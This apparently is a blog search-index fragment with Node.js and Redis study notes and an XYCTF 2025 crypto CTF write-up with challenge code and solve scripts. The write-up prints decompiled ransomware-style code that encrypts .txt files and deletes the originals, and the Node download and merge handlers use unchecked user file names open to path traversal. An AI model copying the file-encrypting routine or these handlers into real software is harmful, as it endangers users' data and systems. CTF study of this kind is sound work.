message: '文件上传成功' }) } catch (error) { next(error) } }) app.post('/merge', async (req, res, next) =\u003e { try { if (!req.body.filename) { return res.status(400).json({ error: '未提供文件名' }) } const files = await fs.readdir(uploadDir) if (files.length === 0) { return res.status(400).json({ error: '没有找到需要合并的文件' }) } // 排序 files.sort((a, b) =\u003e parseInt(a.split('-')[0]) - parseInt(b.split('-')[0])) // 使用原始文件扩展名 const fileExtension = path.extname(req.body.filename) || '' const outputPath = path.join(videoDir, `${req.body.filename}${fileExtension}`) // 使用 Promise.all 并行读取所有文件 const fileContents = await Promise.all( files.map(file =\u003e fs.readFile(path.join(uploadDir, file))) ) // 合并文件 await fs.writeFile(outputPath, Buffer.concat(fileContents)) // 清理临时文件 await Promise.all( files.map(file =\u003e fs.unlink(path.join(uploadDir, file))) ) res.json({ message: '文件合并成功', path: outputPath, size: fileContents.reduce((acc, curr) =\u003e acc + curr.length, 0) }) } catch (error) { next(error) } }) app.use(errorHandler) app.listen(3000, () =\u003e { console.log('server is running on port 3000') }) ","date":"2025-04-09","objectID":"/study_nodejs5/:2:2","tags":["开发","study"],"title":"Study nodejs 「5」","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"文件流下载 文件流下载是一种通过将文件内容以流的形式发送给客户端，实现文件下载的方法。它适用于处理大型文件或需要实时生成文件内容的情况。 ","date":"2025-04-09","objectID":"/study_nodejs5/:3:0","tags":["开发","study"],"title":"Study nodejs 「5」","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"前端实现 \u003cbody\u003e \u003cbutton id=\"btn\"\u003e下载文件\u003c/button\u003e \u003cscript\u003e const btn = document.getElementById('btn'); btn.addEventListener('click', async () =\u003e { try { const response = await fetch('http://localhost:3000/download', { method: 'POST', body: JSON.stringify({ fileName: 'test.txt' }), headers: { 'Content-Type': 'application/json' } }); if (!response.ok) { const error = await response.json(); throw new Error(error.error || '下载失败'); } const blob = await response.blob(); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'test.txt'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); } catch (error) { console.error('下载出错:', error); alert(error.message); } }); \u003c/script\u003e \u003c/body\u003e 前端核心逻辑就是接受的返回值是流的方式arrayBuffer,转成blob，生成下载链接，模拟a标签点击下载 ","date":"2025-04-09","objectID":"/study_nodejs5/:3:1","tags":["开发","study"],"title":"Study nodejs 「5」","uri":"/study_nodejs5/"},{"categories":["nodejs"],"content":"node端 主要的地方在于响应头 Content-Type 指定下载文件的 MIME 类型 application/octet-stream（二进制流数据） application/pdf：Adobe PDF 文件。 application/json：JSON 数据文件 image/jpeg：JPEG 图像文件 Content-Disposition 指定服务器返回的内容在浏览器中的处理方式。它可以用于控制文件下载、内联显示或其他处理方式 attachment：指示浏览器将响应内容作为附件下载。通常与 filename 参数一起使用，用于指定下载文件的名称 inline：指示浏览器直接在浏览器窗口中打开响应内容，如果内容是可识别的文件类型（例如图片或 PDF），则在浏览器中内联显示 import express from \"express\"; import cors from \"cors\"; import fs from \"fs\"; import path from \"path\"; const app = express(); app.use(cors()); app.use(express.json()) app.post('/download', (req, res) =\u003e { try { const fileName = req.body.fileName; if (!fileName) { return res.status(400).json({ error: '文件名不能为空' }); } const filepath = path.join(process.cwd(), 'static', fileName); // 检查文件是否存在 if (!fs.existsSync(filepath)) { return res.status(404).json({ error: '文件不存在' }); } const content = fs.readFileSync(filepath); res.setHeader('Content-Type', 'application/octet-stream'); res.setHeader('Content-Disposition', `attachment; filename=${fileName}`); res.send(content); } catch (error) { console.error('下载文件时出错:', error); res.status(500).json({ error: '服务器内部错误' }); } }); app.listen(3000, () =\u003e { console.log(\"Server is running on port 3000\"); }); ","date":"2025-04-09","objectID":"/study_nodejs5/:3:2","tags":["开发","study"],"title":"Study nodejs 「5」","uri":"/study_nodejs5/"},{"categories":["CTF"],"content":"前言 25年开始以来打的最高质量的密码了？ ","date":"2025-04-07","objectID":"/xyctf2025/:1:0","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"题目 ","date":"2025-04-07","objectID":"/xyctf2025/:2:0","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"Division 抢了个血，怪不好意思的 task.py import random print('----Welcome to my division calc----') print(''' menu: [1] Division calc [2] Get flag ''') while True: choose = input(': \u003e\u003e\u003e ') if choose == '1': try: denominator = int(input('input the denominator: \u003e\u003e\u003e ')) except: print('INPUT NUMBERS') continue nominator = random.getrandbits(32) if denominator == '0': print('NO YOU DONT') continue else: print(f'{nominator}//{denominator} = {nominator//denominator}') elif choose == '2': try: ans = input('input the answer: \u003e\u003e\u003e ') rand1 = random.getrandbits(11000) rand2 = random.getrandbits(10000) correct_ans = rand1 // rand2 if correct_ans == int(ans): print('WOW') with open('flag', 'r') as f: print(f'Here is your flag: {f.read()}') else: print(f'NOPE, the correct answer is {correct_ans}') except: print('INPUT NUMBERS') else: print('Invalid choice') 第一时间拿到就知道是mt19937预测随机数，1里面输入1就可以拿到每次的随机数从而预测了 exp.py from pwn import remote import random from randcrack import RandCrack rc = RandCrack() conn = remote('8.147.132.32', 22975) outputs = [] for _ in range(624): conn.recvuntil(b': \u003e\u003e\u003e ') conn.sendline(b'1') conn.recvuntil(b'input the denominator: \u003e\u003e\u003e ') conn.sendline(b'1') line = conn.recvline().decode().strip() nominator = int(line.split('=')[1].strip()) outputs.append(nominator) rc.submit(nominator) rand1 =rc.predict_getrandbits(11000) rand2 = rc.predict_getrandbits(10000) correct_ans = rand1 // rand2 print(correct_ans) conn.recvuntil(b': \u003e\u003e\u003e ') conn.sendline(b'2') conn.recvuntil(b'input the answer: \u003e\u003e\u003e') conn.sendline(correct_ans) conn.interactive() ","date":"2025-04-07","objectID":"/xyctf2025/:2:1","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"Complex_signin task.py from Crypto.Util.number import * from Crypto.Cipher import ChaCha20 import hashlib from secret import flag class Complex: def __init__(self, re, im): self.re = re self.im = im def __mul__(self, c): re_ = self.re * c.re - self.im * c.im im_ = self.re * c.im + self.im * c.re return Complex(re_, im_) def __eq__(self, c): return self.re == c.re and self.im == c.im def __rshift__(self, m): return Complex(self.re \u003e\u003e m, self.im \u003e\u003e m) def __lshift__(self, m): return Complex(self.re \u003c\u003c m, self.im \u003c\u003c m) def __str__(self): if self.im == 0: return str(self.re) elif self.re == 0: if abs(self.im) == 1: return f\"{'-' if self.im \u003c 0 else ''}i\" else: return f\"{self.im}i\" else: return f\"{self.re} {'+' if self.im \u003e 0 else '-'} {abs(self.im)}i\" def tolist(self): return [self.re, self.im] def complex_pow(c, exp, n): result = Complex(1, 0) while exp \u003e 0: if exp \u0026 1: result = result * c result.re = result.re % n result.im = result.im % n c = c * c c.re = c.re % n c.im = c.im % n exp \u003e\u003e= 1 return result bits = 128 p = getPrime(1024) q = getPrime(1024) n = p * q m = Complex(getRandomRange(1, n), getRandomRange(1, n)) e = 3 c = complex_pow(m, e, n) print(f\"n = {n}\") print(f\"mh = {(m \u003e\u003e bits \u003c\u003c bits).tolist()}\") print(f\"C = {c.tolist()}\") print(f\"enc = {ChaCha20.new(key=hashlib.sha256(str(m.re + m.im).encode()).digest(), nonce=b'Pr3d1ctmyxjj').encrypt(flag)}\") 首先是个复数域的东西，然后是个m高位攻击，注意到复数域和实数域处理方法不一样 那么我们现在有了实部和虚部，m\u003e\u003ebits时可以类比于实部虚部一块位移，但是还是不能分开高位计算，那么就有了两个未知，bits是满足copper的，直接打就行了 exp.py import itertools from Crypto.Util.number import * from tqdm import * def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] k = 128 n = mh = C = # 定义多项式环 PR.\u003cx, y\u003e = PolynomialRing(Zmod(n)) a = mh[0] + x # x 是 al b = mh[1] + y # y 是 bl f1 = (a^3 - 3*a*b^2) - C[0] # 实部方程 f2 = (3*a^2*b - b^3) - C[1] # 虚部方程 res = small_roots(f1,bounds=(2^128,2^128),m=1,d=3) if res != []: print(res) x= y= from Crypto.Cipher import ChaCha20 import hashlib n = mh = enc = x= y= s = (mh[0]) + (mh[1])+x+y key = hashlib.sha256(str(s).encode()).digest() cipher = ChaCha20.new(key=key, nonce=b'Pr3d1ctmyxjj') flag = cipher.decrypt(enc) print(flag) ","date":"2025-04-07","objectID":"/xyctf2025/:2:2","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"勒索病毒 拉下来发现是个exe，猜是python打包出来的，扔到https://pyinstxtractor-web.netlify.app 拆开，拿到pyc和pub.key和enc，然后pyc转py https://www.lddgo.net/string/pyc-compile-decompile task.py # Visit https://www.lddgo.net/string/pyc-compile-decompile for more information # Version : Python 3.8 ''' Created on Sun Mar 30 18:25:08 2025 @author: Crypto0 import re import base64 import os import sys from gmssl import sm4 from Crypto.Util.Padding import pad import binascii from random import shuffle, randrange N = 49 p = 3 q = 128 d = 3 assert q \u003e (6 * d + 1) * p R.\u003cx\u003e = ZZ[] def generate_T(d1, d2): assert N \u003e= d1 + d2 s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2) shuffle(s) return R(s) def invert_mod_prime(f, p): Rp = R.change_ring(Integers(p)).quotient(x^N - 1) return R(lift(1 / Rp(f))) def convolution(f, g): return (f * g) % (x^N - 1) def lift_mod(f, q): return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)]) def poly_mod(f, q): return R([f[i] % q for i in range(N)]) def invert_mod_pow2(f, q): assert q.is_power_of(2) g = invert_mod_prime(f, 2) while True: r = lift_mod(convolution(g, f), q) if r == 1: return g g = lift_mod(convolution(g, 2 - r), q) def generate_message(): return R([randrange(p) - 1 for _ in range(N)]) def generate_key(): while True: try: f = generate_T(d + 1, d) g = generate_T(d, d) Fp = poly_mod(invert_mod_prime(f, p), p) Fq = poly_mod(invert_mod_pow2(f, q), q) break except: continue h = poly_mod(convolution(Fq, g), q) return h, (f, g) def encrypt_message(m, h): e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q) return e def save_ntru_keys(): h, secret = generate_key() with open(\"pub_key.txt\", \"w\") as f: f.write(str(h)) m = generate_message() with open(\"priv_key.txt\", \"w\") as f: f.write(str(m)) e = encrypt_message(m, h) with open(\"enc.txt\", \"w\") as f: f.write(str(e)) def terms(poly_str): terms = [] pattern = r\\'([+-]?\\\\s*x\\\\^?\\\\d*|[-+]?\\\\s*\\\\d+)\\' matches = re.finditer(pattern, poly_str.replace(\\' \\', \\'\\')) for match in matches: term = match.group() if term == \\'+x\\' or term == \\'x\\': terms.append(1) elif term == \\'-x\\': terms.append(-1) elif \\'x^\\' in term: coeff_part = term.split(\\'x^\\')[0] exponent = int(term.split(\\'x^\\')[1]) if not coeff_part or coeff_part == \\'+\\': coeff = 1 elif coeff_part == \\'-\\': coeff = -1 else: coeff = int(coeff_part) terms.append(coeff * exponent) elif \\'x\\' in term: coeff_part = term.split(\\'x\\')[0] if not coeff_part or coeff_part == \\'+\\': terms.append(1) elif coeff_part == \\'-\\': terms.append(-1) else: terms.append(int(coeff_part)) else: if term == \\'+1\\' or term == \\'1\\': terms.append(0) terms.append(-0) return terms def gen_key(poly_terms): binary = [0] * 128 for term in poly_terms: exponent = abs(term) if term \u003e 0 and exponent \u003c= 127: binary[127 - exponent] = 1 binary_str = \\'\\'.join(map(str, binary)) hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32) return hex_key def read_polynomial_from_file(filename): with open(filename, \\'r\\') as file: return file.read().strip() def sm4_encrypt(key, plaintext): assert len(key) == 16, \"SM4 key must be 16 bytes\" cipher = sm4.CryptSM4() cipher.set_key(key, sm4.SM4_ENCRYPT) padded_plaintext = pad(plaintext, 16) return cipher.crypt_ecb(padded_plaintext) def sm4_encrypt_file(input_path, output_path, key): with open(input_path, \\'rb\\') as f: plaintext = f.read() ciphertext = sm4_encrypt(key, plaintext) with open(output_path, \\'wb\\') as f: f.write(ciphertext) def resource_path(relative_path): if getattr(sys, \\'frozen\\', False): base_path = sys._MEIPASS else: base_path = os.path.abspath(\".\") return os.path.join(base_path, relative_path) def encrypt_directory(directory, sm4_key, extensions=[\".txt\"]): if not os.path.exists(directory): print(f\"Directory does not exist: {directory}\") return for root, _, files in os.walk(directory): for file in files: if any(file.endswith(ext) for ext in extensions): input_path = os.path.join(root, file) output_path = input_path + \".enc\" try: sm4_encrypt_file(input_path, output_path, sm4_key) os.remove(input_path) print(f\"Encrypted:","date":"2025-04-07","objectID":"/xyctf2025/:2:3","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"reed task.py import string import random from secret import flag assert flag.startswith('XYCTF{') and flag.endswith('}') flag = flag.rstrip('}').lstrip('XYCTF{') table = string.ascii_letters + string.digits assert all(i in table for i in flag) r = random.Random() class PRNG: def __init__(self, seed): self.a = 1145140 self.b = 19198100 random.seed(seed) def next(self): x = random.randint(self.a, self.b) random.seed(x ** 2 + 1) return x def round(self, k): for _ in range(k): x = self.next() return x def encrypt(msg, a, b): c = [(a * table.index(m) + b) % 19198111 for m in msg] return c seed = int(input('give me seed: ')) prng = PRNG(seed) a = prng.round(r.randrange(2**16)) b = prng.round(r.randrange(2**16)) enc = encrypt(flag, a, b) print(enc) 输入seed，然后产生$a*x+b \\bmod p$，赛后听别的师傅说类似lcg，可以通过循环去限定ab的范围，然后排列组合爆破出来，啧，没想到，但是直接暴力匹配也可以 exp.py from string import ascii_letters, digits import re from typing import List, Tuple, Optional, Set CHAR_TABLE = ascii_letters + digits MOD = 19198111 ENC = [] def extended_gcd(a: int, b: int) -\u003e Tuple[int, int, int]: if a == 0: return b, 0, 1 g, y, x = extended_gcd(b % a, a) return g, x - (b // a) * y, y def modinv(a: int, m: int) -\u003e Optional[int]: g, x, _ = extended_gcd(a, m) return x % m if g == 1 else None def is_readable(s: str) -\u003e bool: return bool(re.search(r'[A-Za-z]{2,}', s)) and len(re.findall(r'\\d', s)) \u003c 5 def solve() -\u003e List[str]: candidates: Set[str] = set() processed: Set[Tuple[int, int]] = set() table_len = len(CHAR_TABLE) cipher_pairs = [(i, j) for i in range(len(ENC)) for j in range(i + 1, len(ENC)) if ENC[i] != ENC[j]] for idx1, idx2 in cipher_pairs: c1, c2 = ENC[idx1], ENC[idx2] delta_c = (c1 - c2) % MOD for i1 in range(table_len): p1 = ord(CHAR_TABLE[i1]) for i2 in range(table_len): if i1 == i2: continue p2 = ord(CHAR_TABLE[i2]) delta_i = (p1 - p2) % MOD inv = modinv(delta_i, MOD) if inv is None: continue a = (delta_c * inv) % MOD b = (c1 - a * p1) % MOD if (a, b) in processed: continue processed.add((a, b)) a_inv = modinv(a, MOD) if a_inv is None: continue flag = [] for c in ENC: i = ((c - b) * a_inv) % MOD if not (0 \u003c= i \u003c table_len): break flag.append(CHAR_TABLE[i]) else: candidate = ''.join(flag) if len(candidate) == len(ENC): candidates.add(candidate) readable = [f for f in candidates if is_readable(f)] return readable if readable else list(candidates) def main(): results = solve() print(f\"Found {len(results)} possible candidates:\") for idx, flag in enumerate(results, 1): print(f\"#{idx}: XYCTF{{{flag}}}\") if __name__ == \"__main__\": main() ","date":"2025-04-07","objectID":"/xyctf2025/:2:4","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"复复复数 task.py class ComComplex: def __init__(self, value=[0,0,0,0]): self.value = value def __str__(self): s = str(self.value[0]) for k,i in enumerate(self.value[1:]): if i \u003e= 0: s += '+' s += str(i) +'ijk'[k] return s def __add__(self,x): return ComComplex([i+j for i,j in zip(self.value,x.value)]) def __mul__(self,x): a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3] b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2] c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1] d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0] return ComComplex([a,b,c,d]) def __mod__(self,x): return ComComplex([i % x for i in self.value]) def __pow__(self, x, n=None): tmp = ComComplex(self.value) a = ComComplex([1,0,0,0]) while x: if x \u0026 1: a *= tmp tmp *= tmp if n: a %= n tmp %= n x \u003e\u003e= 1 return a from Crypto.Util.number import * from secret import flag, hint p = getPrime(256) q = getPrime(256) r = getPrime(256) n = p * q * r P = getPrime(512) assert len(hint) == 20 hints = ComComplex([bytes_to_long(hint[i:i+5]) for i in range(0,20,5)]) keys = ComComplex([0, p, q, r]) print('hint =',hints) print('gift =',hints*keys%P) print('P =',P) e = 65547 m = ComComplex([bytes_to_long(flag[i:i+len(flag)//4+1]) for i in range(0,len(flag),len(flag)//4+1)]) c = pow(m, e, n) print('n =', n) print('c =', c) 感觉ai比我懂，优先去回复pqr，代码定义的乘法就是四元数，那么就是三个线性同余式，可以直接去求解，让ai帮我搓个代码 from Crypto.Util.number import long_to_bytes, inverse, bytes_to_long, getPrime from sympy import Matrix import sys class ComComplex: def __init__(self, value=[0,0,0,0]): self.value = value def __str__(self): s = str(self.value[0]) for k,i in enumerate(self.value[1:]): if i \u003e= 0: s += '+' s += str(i) +'ijk'[k] return s def __add__(self,x): return ComComplex([i+j for i,j in zip(self.value,x.value)]) def __mul__(self,x): a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3] b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2] c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1] d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0] return ComComplex([a,b,c,d]) def __mod__(self,x): return ComComplex([i % x for i in self.value]) def __pow__(self, x, n=None): tmp = ComComplex(self.value) a = ComComplex([1,0,0,0]) while x: if x \u0026 1: a *= tmp tmp *= tmp if n: a %= n tmp %= n x \u003e\u003e= 1 return a A = 375413371936 B = 452903063925 C = 418564633198 D = 452841062207 G0 = G1 = G2 = G3 = P = M = Matrix([ [-B, -C, -D], [ A, -D, C], [ D, A, -B] ]) v = Matrix([G0 % P, G1 % P, G2 % P]) M_inv = M.inv_mod(P) solution = M_inv * v p1 = int(solution[0] % P) q1 = int(solution[1] % P) r1 = int(solution[2] % P) print(p1,q1,r1) 然后本来想直接求flag，发现e=65547，不互素，拿个以前的crt直接用就行了 from Crypto.Util.number import * from Crypto.Util.number import GCD as gcd class ComComplex: def __init__(self, value=[0,0,0,0]): self.value = value def __str__(self): s = str(self.value[0]) for k,i in enumerate(self.value[1:]): if i \u003e= 0: s += '+' s += str(i) +'ijk'[k] return s def __add__(self,x): return ComComplex([i+j for i,j in zip(self.value,x.value)]) def __mul__(self,x): a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3] b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2] c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1] d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0] return ComComplex([a,b,c,d]) def __mod__(self,x): return ComComplex([i % x for i in self.value]) def __pow__(self, x, n=None): tmp = ComComplex(self.value) a = ComComplex([1,0,0,0]) wh","date":"2025-04-07","objectID":"/xyctf2025/:2:5","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"choice choice.py from Crypto.Util.number import bytes_to_long from random import Random from secret import flag assert flag.startswith(b'XYCTF{') and flag.endswith(b'}') flag = flag[6:-1] msg = bytes_to_long(flag) rand = Random() test = bytes([i for i in range(255, -1, -1)]) open('output.py', 'w').write(f'enc = {msg ^ rand.getrandbits(msg.bit_length())}\\nr = {[rand.choice(test) for _ in range(2496)]}') random.py \"\"\"Random variable generators. bytes ----- uniform bytes (values between 0 and 255) integers -------- uniform within range sequences --------- pick random element pick random sample pick weighted random sample generate random permutation distributions on the real line: ------------------------------ uniform triangular normal (Gaussian) lognormal negative exponential gamma beta pareto Weibull distributions on the circle (angles 0 to 2pi) --------------------------------------------- circular uniform von Mises discrete distributions ---------------------- binomial General notes on the underlying Mersenne Twister core generator: * The period is 2**19937-1. * It is one of the most extensively tested generators in existence. * The random() method is implemented in C, executes in a single Python step, and is, therefore, threadsafe. \"\"\" # Translated by Guido van Rossum from C source provided by # Adrian Baddeley. Adapted by Raymond Hettinger for use with # the Mersenne Twister and os.urandom() core generators. from warnings import warn as _warn from math import log as _log, exp as _exp, pi as _pi, e as _e, ceil as _ceil from math import sqrt as _sqrt, acos as _acos, cos as _cos, sin as _sin from math import tau as TWOPI, floor as _floor, isfinite as _isfinite from math import lgamma as _lgamma, fabs as _fabs, log2 as _log2 from os import urandom as _urandom from _collections_abc import Sequence as _Sequence from operator import index as _index from itertools import accumulate as _accumulate, repeat as _repeat from bisect import bisect as _bisect import os as _os import _random try: # hashlib is pretty heavy to load, try lean internal module first from _sha2 import sha512 as _sha512 except ImportError: # fallback to official implementation from hashlib import sha512 as _sha512 __all__ = [ \"Random\", \"SystemRandom\", \"betavariate\", \"binomialvariate\", \"choice\", \"choices\", \"expovariate\", \"gammavariate\", \"gauss\", \"getrandbits\", \"getstate\", \"lognormvariate\", \"normalvariate\", \"paretovariate\", \"randbytes\", \"randint\", \"random\", \"randrange\", \"sample\", \"seed\", \"setstate\", \"shuffle\", \"triangular\", \"uniform\", \"vonmisesvariate\", \"weibullvariate\", ] NV_MAGICCONST = 4 * _exp(-0.5) / _sqrt(2.0) LOG4 = _log(4.0) SG_MAGICCONST = 1.0 + _log(4.5) BPF = 53 # Number of bits in a float RECIP_BPF = 2 ** -BPF _ONE = 1 class Random(_random.Random): \"\"\"Random number generator base class used by bound module functions. Used to instantiate instances of Random to get generators that don't share state. Class Random can also be subclassed if you want to use a different basic generator of your own devising: in that case, override the following methods: random(), seed(), getstate(), and setstate(). Optionally, implement a getrandbits() method so that randrange() can cover arbitrarily large ranges. \"\"\" VERSION = 3 # used by getstate/setstate def __init__(self, x=None): \"\"\"Initialize an instance. Optional argument x controls seeding, as for Random.seed(). \"\"\" self.seed(x) self.gauss_next = None def seed(self, a=None, version=2): \"\"\"Initialize internal state from a seed. The only supported seed types are None, int, float, str, bytes, and bytearray. None or no argument seeds from current time or from an operating system specific randomness source if available. If *a* is an int, all bits are used. For version 2 (the default), all of the bits are used if *a* is a str, bytes, or bytearray. For version 1 (provided for reproducing random sequences from older versions of Python), the algorithm for str and bytes generates a narrower range of seeds. \"\"\" if version == 1 and ","date":"2025-04-07","objectID":"/xyctf2025/:2:6","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"prng_xxxx 等官方wp吧 ","date":"2025-04-07","objectID":"/xyctf2025/:2:7","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"总结 质量真的挺高的，不愧是大恶人出的题(，但是队友的发挥，害，算了，吐槽到不想吐槽了 ","date":"2025-04-07","objectID":"/xyctf2025/:3:0","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["nodejs"],"content":"Redis ","date":"2025-04-06","objectID":"/study_nodejs4/:1:0","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"docker部署 本地是mac，加上初学不想污染环境，就用docker试试 docker pull redis docker run -p 6379:6379 -d - redis-server --appendonly yes docker rename funny_buck redis docker exec -it redis redis-cli //vsc中Database Client可以可视化 ","date":"2025-04-06","objectID":"/study_nodejs4/:1:1","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"字符串命令 SET key value [NX|XX] [EX seconds] [PX milliseconds] [GET] key：要设置的键名。 value：要设置的值。 NX：可选参数，表示只在键不存在时才设置值。 XX：可选参数，表示只在键已经存在时才设置值。 EX seconds：可选参数，将键的过期时间设置为指定的秒数。 PX milliseconds：可选参数，将键的过期时间设置为指定的毫秒数。 GET：可选参数，返回键的旧值。 比如 SET name zsm NX EX 60 就是在键名name不存在时，设置键名为name的值为zsm，并且设置键名的过期时间为60秒。 SET score 5 XX 在键名score已经存在时，设置键名为score的值为5。 DEL name 删除键名为name的键值对。 ","date":"2025-04-06","objectID":"/study_nodejs4/:1:2","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"集合命令 SADD fruits \"apple\" SADD fruits \"banana\" SADD fruits \"orange\" SADD命令用于向集合中添加元素。 SADD命令的语法为：SADD key member [member ...]，其中key为集合的名称，member为要添加的元素。 SMEMBERS fruits SMEMBERS命令用于获取集合中的所有元素。 SISMEMBER fruits \"apple\" SISMEMBER命令用于判断一个元素是否在集合中。 SREM fruits \"banana\" SREM命令用于从集合中删除一个或多个元素。 SCARD fruits SCARD命令用于获取集合中的元素个数。 SRANDMEMBER fruits SRANDMEMBER命令用于从集合中随机获取一个元素。 SUNION fruits vegetables SUNION命令用于将多个集合进行并集操作。 SINTER fruits vegetables SINTER命令用于将多个集合进行交集操作。 SDIFF fruits vegetables SDIFF命令用于将多个集合进行差集操作。 ","date":"2025-04-06","objectID":"/study_nodejs4/:1:3","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"哈希表命令 HSET obj name \"John\" HSET obj age 25 HSET obj email \"john@example.com\" HSET命令用于向哈希表中添加键值对。 HSET命令的语法为：HSET key field value [field value ...]，其中key为哈希表的名称，field为键名，value为键值。 HGET obj name HGET命令用于获取哈希表中指定键的值。 HMSET obj name \"John\" age 25 email \"john@example.com\" HMSET命令用于向哈希表中添加多个键值对。 HMGET obj name age email HMGET命令用于获取哈希表中指定键的值。 HGETALL obj HGETALL命令用于获取哈希表中的所有键值对。 HDEL obj age email HDEL命令用于删除哈希表中的指定键。 HEXISTS obj name HEXISTS命令用于判断哈希表中是否存在指定键。 HKEYS obj HKEYS命令用于获取哈希表中的所有键。 HVALS obj HVALS命令用于获取哈希表中的所有值。 HLEN obj HLEN命令用于获取哈希表中的键值对个数。 ","date":"2025-04-06","objectID":"/study_nodejs4/:1:4","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"列表命令 RPUSH key element1 element2 element3 LPUSH key element1 element2 element3 RPUSH命令用于将元素从右侧插入列表。 LPUSH命令用于将元素从左侧插入列表。 RPUSH\u0026LPUSH命令的语法为：RPUSH key element [element ...]，其中key为列表的名称，element为要插入的元素。 LINDEX key index LRANGE key start stop LINDEX命令用于获取列表中指定索引位置的元素。 LRANGE命令用于获取列表中指定范围内的元素。 LSET key index newValue LSET命令用于修改列表中指定索引位置的元素的值。 LPOP key RPOP key LREM key count value LPOP命令用于从列表的左侧移除并返回第一个元素。 RPOP命令用于从列表的右侧移除并返回最后一个元素。 LREM命令用于从列表中删除指定数量的指定值元素。 LLEN key LLEN命令用于获取列表的长度。 ","date":"2025-04-06","objectID":"/study_nodejs4/:1:5","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"持久化 RDB（Redis Database）持久化：RDB是一种快照的形式，它会将内存中的数据定期保存到磁盘上。可以通过配置Redis服务器，设置自动触发RDB快照的条件，比如在指定的时间间隔内，或者在指定的写操作次数达到一定阈值时进行快照保存。RDB持久化生成的快照文件是一个二进制文件，包含了Redis数据的完整状态。在恢复数据时，可以通过加载快照文件将数据重新加载到内存中。 AOF（Append-Only File）持久化：AOF持久化记录了Redis服务器执行的所有写操作命令，在文件中以追加的方式保存。当Redis需要重启时，可以重新执行AOF文件中保存的命令，以重新构建数据集。相比于RDB持久化，AOF持久化提供了更好的数据恢复保证，因为它记录了每个写操作，而不是快照的形式。然而，AOF文件相对于RDB文件更大，恢复数据的速度可能会比较慢。 启动docker的时候- redis-server –appendonly yes就是打开了rdb docker exec -it redis bash root@4f92f5f4b595:/data# ls appendonlydir dump.rdb 如果想通过配置文件修改，可以通过下载tar包或者是编写dockerfile ","date":"2025-04-06","objectID":"/study_nodejs4/:1:6","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"订阅\u0026事务 订阅 监听命令 subscribe 推送命令 publish 整体效果 127.0.0.1:6379\u003e subscribe zsm 1) \"subscribe\" 2) \"zsm\" 3) (integer) 1 1) \"message\" 2) \"zsm\" 3) \"200\" 127.0.0.1:6379\u003e publish zsm 200 (integer) 1 